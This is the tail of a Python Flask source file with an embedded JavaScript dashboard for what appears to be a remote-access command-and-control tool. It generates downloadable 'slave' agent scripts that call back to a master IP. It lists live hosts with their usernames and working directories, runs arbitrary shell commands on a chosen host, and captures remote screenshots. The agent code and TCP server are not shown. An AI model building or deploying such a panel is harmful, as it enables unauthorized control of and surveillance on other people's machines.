function fmtTime(ts) {
  if (!ts) return '—';
  const d = new Date(ts * 1000);
  const now = Date.now();
  const diff = Math.floor((now - ts * 1000) / 1000);
  if (diff < 60)  return diff + 's ago';
  if (diff < 3600) return Math.floor(diff/60) + 'm ago';
  return d.toLocaleTimeString();
}

// ---- POLL SLAVES ----
async function pollSlaves() {
  try {
    const r = await fetch('/api/slaves');
    const data = await r.json();
    allSlaves = data;
    renderNodes(data);
    updateTopbar(data);
    updateTerminalLivePanel(data);
  } catch(e) {}
}


function updateTopbar(data) {
  const ids    = Object.keys(data);
  const online = ids.filter(id => data[id].active).length;
  document.getElementById('tb-online').textContent = online;
  document.getElementById('tb-total').textContent  = ids.length;
}

function updateTerminalLivePanel(data) {
  const tbody = document.getElementById('live-term-body');
  const onlineIds = Object.keys(data).filter(id => data[id].active === true);
  const count = onlineIds.length;
  document.getElementById('live-term-count').textContent = count + ' online';

  if (count === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:20px;">No live hosts</td></tr>';
    return;
  }

  let html = '';
  for (let id of onlineIds) {
    const node = data[id];
    const termLabel = `⩾ ${node.name.substring(0, 8)}/tty`;
    html += `
      <tr onclick="selectNode('${id}','${node.name}')">
        <td class="term-name" title="Host: ${esc(node.hostname)} | CWD: ${esc(node.cwd)}">${esc(node.name)}</td>
        <td class="term-ip">${esc(node.ip || '—')}</td>
        <td class="term-last">${fmtTime(node.last_seen)}</td>
        <td>${esc(node.username || '?')}</td>
        <td><span class="term-label">${esc(termLabel)}</span></td>
      </tr>
    `;
  }
  tbody.innerHTML = html;
}

function renderNodes(data) {
  const tbody = document.getElementById('nodes-body');
  const ids   = Object.keys(data);

  document.getElementById('nodes-count').textContent = ids.length + ' node' + (ids.length===1?'':'s');

  if (!ids.length) {
    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:30px;font-family:var(--mono);font-size:11px;">No nodes registered — create one →</td></tr>`;
    return;
  }

  // Keep existing rows if possible (to preserve selection highlight)
  tbody.innerHTML = ids.map(id => {
    const n = data[id];
    const sel = (id === selectedId) ? ' sel-row' : '';
    const statusHtml = n.active
      ? `<span class="status-badge s-online"><span class="s-dot"></span>ONLINE</span>`
      : `<span class="status-badge s-offline"><span class="s-dot"></span>OFFLINE</span>`;
    return `<tr class="${sel}" onclick="selectNode('${esc(id)}','${esc(n.name)}')">
      <td>
        <div class="node-name" title="Host: ${esc(n.hostname)} | User: ${esc(n.username)} | CWD: ${esc(n.cwd)}">${esc(n.name)}</div>
        <div class="node-id">${id}</div>
      </td>
      <td>${statusHtml}</td>
      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">${esc(n.ip || '—')}</td>
      <td style="font-family:var(--mono);font-size:10px;color:var(--muted)">${fmtTime(n.last_seen)}</td>
      <td style="white-space: nowrap;">
        <button class="btn btn-ghost" style="font-size:9px;padding:4px 8px" onclick="event.stopPropagation();viewScript('${esc(id)}','${esc(n.name)}')">📄 VIEW</button>
        <button class="btn btn-ghost" style="font-size:9px;padding:4px 8px" onclick="event.stopPropagation();dlScript('${esc(id)}','${esc(n.name)}')">↓ PY</button>
      </td>
    </tr>`;
  }).join('');

  // If selected node went offline, dim the run button
  if (selectedId && data[selectedId] && !data[selectedId].active) {
    document.getElementById('run-btn').classList.add('btn-disabled');
  }
}

// ---- SELECT NODE ----
function selectNode(id, name) {
  selectedId   = id;
  selectedName = name;
  document.getElementById('target-display').textContent = name + '  (' + id + ')';
  document.getElementById('out-target').textContent = name;

  const online = allSlaves[id] && allSlaves[id].active;
  const runBtn = document.getElementById('run-btn');
  const shotBtn = document.getElementById('screenshot-btn');
  if (online) {
    runBtn.classList.remove('btn-disabled');
    shotBtn.classList.remove('btn-disabled');
    shotBtn.disabled = false;
  } else {
    runBtn.classList.add('btn-disabled');
    shotBtn.classList.add('btn-disabled');
    shotBtn.disabled = true;
  }

  renderNodes(allSlaves);
  document.getElementById('cmd-input').focus();
}

function clearTarget() {
  selectedId   = null;
  selectedName = null;
  document.getElementById('target-display').textContent = '— select a node above —';
  document.getElementById('out-target').textContent = 'no target';
  document.getElementById('run-btn').classList.add('btn-disabled');
  const shotBtn = document.getElementById('screenshot-btn');
  shotBtn.classList.add('btn-disabled');
  shotBtn.disabled = true;
  renderNodes(allSlaves);
}

// ---- RUN COMMAND ----
async function runCommand() {
  if (!selectedId) return;
  const cmd = document.getElementById('cmd-input').value.trim();
  if (!cmd) return;

  const out = document.getElementById('output-body');
  out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>\n<span style="color:var(--muted)"><span class="spin"></span>  running...</span>`;

  try {
    const r = await fetch('/api/execute', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({slave_id: selectedId, command: cmd})
    });
    const data = await r.json();
    const isErr = data.output.startsWith('ERROR') || data.output.startsWith('Error') || data.output.startsWith('Communication');
    
    // Check if output is a PNG base64 (screenshot)
    if (data.output.startsWith('iVBORw0KGgo')) {
      out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>
                       <img src="data:image/png;base64,${data.output}" style="max-width:100%; border:1px solid var(--border); margin-top:8px;">`;
    } else {
      out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>
                       <span class="${isErr?'err':''}">${esc(data.output)}</span>`;
    }
  } catch(e) {
    out.innerHTML += `\n<span class="err">Fetch error: ${esc(e)}</span>`;
  }
}

function cmdKeydown(e) {
  if (e.key === 'Enter') runCommand();
}

function clearOutput() {
  document.getElementById('output-body').innerHTML = '<span class="placeholder">› Cleared.</span>';
}

async function runScreenshot() {
  if (!selectedId) {
    toast('Select a node first');
    return;
  }

  const cmd = 'screenshot';
  const out = document.getElementById('output-body');
  out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>\n<span style="color:var(--muted)"><span class="spin"></span>  capturing screen...</span>`;

  try {
    const r = await fetch('/api/execute', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({slave_id: selectedId, command: cmd})
    });
    const data = await r.json();
    const isErr = data.output.startsWith('ERROR') || data.output.startsWith('Error') || data.output.startsWith('Communication');

    if (data.output.startsWith('iVBORw0KGgo')) {
      out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>
                       <img src="data:image/png;base64,${data.output}" style="max-width:100%; border:1px solid var(--border); margin-top:8px;">`;
    } else {
      out.innerHTML = `<span class="cmd-echo">› ${esc(selectedName)} $ ${esc(cmd)}</span>
                       <span class="${isErr?'err':''}">${esc(data.output)}</span>`;
    }
  } catch(e) {
    out.innerHTML += `\n<span class="err">Fetch error: ${esc(e)}</span>`;
  }
}

// ---- CREATE NODE ----
async function createSlave() {
  const name = document.getElementById('slave-name-input').value.trim();
  if (!name) { toast('Enter a node name'); return; }

  const btn  = document.getElementById('create-btn');
  const inner= document.getElementById('create-btn-inner');
  btn.classList.add('btn-disabled');
  inner.innerHTML = '<span class="spin"></span>  GENERATING...';

  try {
    const r = await fetch('/api/create_slave', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({name})
    });
    const data = await r.json();
    if (data.error) { toast('✗ ' + data.error); return; }

    pendingScript = data;
    document.getElementById('smeta-name').textContent = data.name;
    document.getElementById('smeta-id').textContent   = data.slave_id;
    document.getElementById('smeta-file').textContent = data.filename;
    document.getElementById('script-code').textContent = data.script;
    document.getElementById('script-panel').style.display = 'flex';
    document.getElementById('slave-name-input').value = '';
    toast('✓ Node created — download script below');
    pollSlaves();
  } catch(e) {
    toast('Error: ' + e);
  } finally {
    btn.classList.remove('btn-disabled');
    inner.textContent = '+ GENERATE NODE';
  }
}

// ---- DOWNLOAD / COPY SCRIPT ----
function downloadScript() {
  if (!pendingScript) return;
  const blob = new Blob([pendingScript.script], {type:'text/x-python'});
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href = url; a.download = pendingScript.filename;
  document.body.appendChild(a); a.click();
  document.body.removeChild(a); URL.revokeObjectURL(url);
  toast('✓ Script downloaded');
}

function copyScript() {
  if (!pendingScript) return;
  navigator.clipboard.writeText(pendingScript.script).then(() => toast('✓ Copied to clipboard'));
}

// ---- VIEW / DOWNLOAD FROM TABLE ----
async function viewScript(id, name) {
  try {
    const r = await fetch('/api/get_script/' + id);
    const data = await r.json();
    if (data.error) { toast('✗ ' + data.error); return; }
    pendingScript = data;
    document.getElementById('smeta-name').textContent = data.name;
    document.getElementById('smeta-id').textContent   = data.slave_id;
    document.getElementById('smeta-file').textContent = data.filename;
    document.getElementById('script-code').textContent = data.script;
    document.getElementById('script-panel').style.display = 'flex';
    toast('✓ Script loaded – you can now copy or download');
  } catch(e) {
    toast('Error: ' + e);
  }
}

async function dlScript(id, name) {
  try {
    const r = await fetch('/api/get_script/' + id);
    const data = await r.json();
    if (data.error) { toast('✗ ' + data.error); return; }
    const blob = new Blob([data.script], {type:'text/x-python'});
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = data.filename;
    document.body.appendChild(a); a.click();
    document.body.removeChild(a); URL.revokeObjectURL(url);
    toast('✓ Script downloaded: ' + data.filename);
  } catch(e) {
    toast('Error: ' + e);
  }
}


// ---- POLL LOGS ----
async function pollLogs() {
  try {
    const r = await fetch('/api/logs');
    const data = await r.json();
    if (data.logs.length === lastLogLen) return;
    lastLogLen = data.logs.length;
    document.getElementById('log-count').textContent = lastLogLen;
    const body = document.getElementById('log-body');
    body.innerHTML = data.logs.map(line => {
      let cls = 'info';
      if (/ONLINE/.test(line))   cls = 'good';
      if (/OFFLINE|ERROR|REJECT/.test(line)) cls = 'bad';
      if (/CMD|saved|Loaded|DB/.test(line)) cls = 'warn';
      return `<div class="log-line ${cls}">${esc(line)}</div>`;
    }).join('');
  } catch(e) {}
}

// ---- MAIN POLL ----
setInterval(pollSlaves, 2000);
setInterval(pollLogs,   1500);
pollSlaves(); pollLogs();
</script>
</body>
</html>
""".replace('__MASTER_IP__', MASTER_IP).replace('__TCP_PORT__', str(TCP_PORT))

@app.route('/')
def index():
    return HTML

@app.route('/api/slaves')
def api_slaves():
    with slaves_lock:
        out = {}
        for sid, info in slaves.items():
            out[sid] = {
                'name':      info.get('name'),
                'active':    sid in active_slaves,
                'ip':        info.get('ip') if sid in active_slaves else None,
                'last_seen': info.get('last_seen'),
                'hostname':  info.get('hostname', ''),
                'username':  info.get('username', ''),
                'cwd':       info.get('cwd', ''),
            }
    return jsonify(out)

@app.route('/api/create_slave', methods=['POST'])
def api_create_slave():
    try:
        name = request.json.get('name', '').strip()
        if not name:
            return jsonify({'error': 'Node name is required'}), 400

        with slaves_lock:
            if any(info['name'].lower() == name.lower() for info in slaves.values()):
                return jsonify({'error': f'Node name "{name}" already exists'}), 400
            new_id = str(uuid.uuid4())[:12]
            slaves[new_id] = {
                'name':       name,
                'created_at': time.time(),
                'last_seen':  None,
                'ip':         None,
            }
        save_slaves()

        script = generate_slave_script(new_id, name)
        filename = save_slave_script(new_id, name, script)
        return jsonify({'slave_id': new_id, 'name': name, 'script': script, 'filename': filename})
    except PermissionError as e:
        log_event(f"PERMISSION ERROR: {e}")
        return jsonify({'error': f'Permission denied: {e}. Run master from a writable directory.'}), 500
    except Exception as e:
        log_event(f"CREATE SLAVE ERROR: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/get_script/<slave_id>')
def api_get_script(slave_id):
    with slaves_lock:
        info = slaves.get(slave_id)
    if not info:
        return jsonify({'error': 'Node not found'}), 404
    script   = generate_slave_script(slave_id, info['name'])
    filename = save_slave_script(slave_id, info['name'], script)
    return jsonify({'script': script, 'filename': filename, 'name': info['name'], 'slave_id': slave_id})


@app.route('/api/execute', methods=['POST'])
def api_execute():
    data     = request.json or {}
    slave_id = data.get('slave_id', '').strip()
    command  = data.get('command', '').strip()
    if not slave_id or not command:
        return jsonify({'error': 'Missing slave_id or command'}), 400
    output = execute_command(slave_id, command)
    return jsonify({'output': output})

@app.route('/api/logs')
def api_logs():
    with log_lock:
        return jsonify({'logs': list(event_log)})

# ========== ENTRY POINT ==========
if __name__ == '__main__':
    print("=" * 52)
    print("  MASTER CONTROLLER  —  CyberOps Edition")
    print(f"  Master IP  : {MASTER_IP}")
    print(f"  TCP Port   : {TCP_PORT}")
    print(f"  Dashboard  : http://0.0.0.0:{WEB_PORT}")
    print("=" * 52)
    load_slaves()
    threading.Thread(target=tcp_server_loop, daemon=True).start()
    app.run(host=WEB_HOST, port=WEB_PORT, debug=False, use_reloader=False)
